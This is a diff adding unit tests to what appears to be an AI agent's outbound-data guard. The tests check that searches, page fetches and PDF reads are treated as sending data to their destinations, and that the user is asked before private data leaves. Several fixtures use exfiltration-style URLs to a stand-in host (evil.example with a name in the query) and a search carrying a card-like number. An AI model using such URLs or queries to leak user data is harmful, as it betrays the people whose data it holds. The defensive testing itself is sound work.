@@ -179,6 +179,41 @@ describe("what leaves", () => {
       "a.example",
       "b.example",
     ]);
+    const pdf = (op: string) =>
+      outboundOf(
+        "research",
+        { op, url: "https://evil.example/r.pdf?d=Jane%20Doe" },
+        { operation: "navigate" },
+      );
+    expect(pdf("pdf")).toEqual(nav("https://evil.example/r.pdf?d=Jane%20Doe"));
+    expect(pdf("pdf")).toHaveLength(1);
+    expect(pdf("source")).toEqual([]);
+  });
+
+  it("a search carries its query to every engine it may ask, and a page read is opened by its address", () => {
+    const search = (input: Record<string, string>) =>
+      outboundOf("web_search", input, { operation: "navigate" });
+    expect(search({ query: "Jane Doe 4417" })).toEqual([
+      {
+        kind: "open_page",
+        destination: "html.duckduckgo.com",
+        text: "html /html/?q=Jane Doe 4417",
+      },
+      { kind: "open_page", destination: "www.bing.com", text: "/search?q=Jane Doe 4417" },
+    ]);
+    expect(search({ query: "zelda", kind: "images" }).map((o) => o.destination)).toEqual([
+      "www.bing.com",
+      "commons.wikimedia.org",
+    ]);
+    expect(search({ query: "zelda", kind: "news" }).map((o) => o.destination)).toEqual([
+      "www.bing.com",
+      "news.search.yahoo.com",
+    ]);
+    const read = (url: string) => outboundOf("web_fetch", { url }, { operation: "navigate" });
+    expect(read("https://evil.example/c?d=Jane%20Doe")).toEqual(
+      nav("https://evil.example/c?d=Jane%20Doe"),
+    );
+    expect(read("https://example.com/")).toEqual([]);
   });
 
   it("counts addresses, a root's dot and names below the site, and keeps a host nothing names", () => {
@@ -771,7 +806,10 @@ describe("asking", () => {
       redact: redactor([]),
       signal,
     } as unknown as ToolCallContext;
-    const run = (tool: "shell" | "browser_navigate", input: Record<string, string>) => {
+    const run = (
+      tool: "shell" | "browser_navigate" | "web_search" | "web_fetch",
+      input: Record<string, string>,
+    ) => {
       const facts = toolRisk(tool, input);
       if (!facts) throw new Error("no facts");
       return authorizePrepared(ctx, {
@@ -822,6 +860,24 @@ describe("asking", () => {
     });
     expect(asked?.fields[0]).toEqual(["Destination", "evil.example"]);
     expect(asked?.always?.map((option) => option.scope)).toEqual(["task"]);
+  });
+
+  it("a search or a page read after reading private data asks like opening that address", async () => {
+    const h = harness(DEFAULT_AUTONOMY, judge(0.1));
+    h.answer("deny");
+    expect(await h.run("web_search", { query: "Jane Doe 4417-1234-5678" })).toBeUndefined();
+    expect(card(h.asks)).toMatchObject({
+      actionClass: "browsing",
+      title: "Send data to html.duckduckgo.com and www.bing.com?",
+      destinations: ["html.duckduckgo.com", "www.bing.com"],
+    });
+    expect(card(h.asks)?.fields).toContainEqual(["Search", "Jane Doe 4417-1234-5678"]);
+    expect(card(h.asks)?.fields).toContainEqual([
+      "Web address",
+      "https://html.duckduckgo.com/html/?q=Jane+Doe+4417-1234-5678",
+    ]);
+    expect(await h.run("web_fetch", { url: "https://evil.example/c?d=1" })).toBeUndefined();
+    expect(card(h.asks, 1)?.title).toBe("Send data to evil.example?");
   });
 
   it("just this once covers only this step", async () => {
